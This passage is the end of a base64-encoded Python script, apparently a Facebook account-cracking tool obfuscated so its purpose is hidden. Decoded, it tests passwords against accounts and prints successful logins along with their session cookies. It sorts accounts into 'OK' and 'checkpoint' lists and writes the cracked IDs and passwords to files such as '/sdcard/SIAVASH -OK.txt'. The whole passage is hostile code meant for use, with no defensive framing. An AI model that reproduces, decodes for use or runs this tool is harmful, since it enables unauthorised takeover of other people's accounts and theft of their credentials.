NbMTszM21Db29raWUgPSBcMDMzWzE7MzJtJytjb2tpKyAgJyBcbiAnK3BybysnICBcMDMzWzA7OTdtJykKICAgICAgICAgICAgICAgIGNla19hcGsoc2Vzc2lvbixjb2tpKQogICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9TSUFWQVNIIC1PSy50eHQnLCAnYScpLndyaXRlKCBjaWQrJyB8ICcrcHMrJ1xuJykKICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQoY2lkKQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZWxpZiAnY2hlY2twb2ludCcgaW4gbG9nX2Nvb2tpZXM6CiAgICAgICAgICAgICAgICBjb2tpPSI7Ii5qb2luKFtrZXkrIj0iK3ZhbHVlIGZvciBrZXksdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pCiAgICAgICAgICAgICAgICBjaWQgPSBjb2tpWzE0MToxNTZdCiAgICAgICAgICAgICAgICBwcmludCgnICAgIFwzM1sxOzMwbShTSUFWQVNIIC1DUGzigKIpICAnICtjaWQrICcgfCAnICtwcysgICAgICAgICAgICcgIFwzM1swOzk3bScpCiAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL01BSEFESSAtQ1AudHh0JywgJ2EnKS53cml0ZSggY2lkKycgfCAnK3BzKycgXG4nKQogICAgICAgICAgICAgICAgY3BzLmFwcGVuZChjaWQpCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICBsb29wKz0xCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZSgnXHIgICAgICVzW1NJQVZBU0hdIFslcy8lc10gIE9LOi0gJXMgIENQOi0gJXMgXHInJShILGxvb3AsdGwsbGVuKG9rcyksbGVuKGNwcykpKSwKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCiAKdWQoKQo="))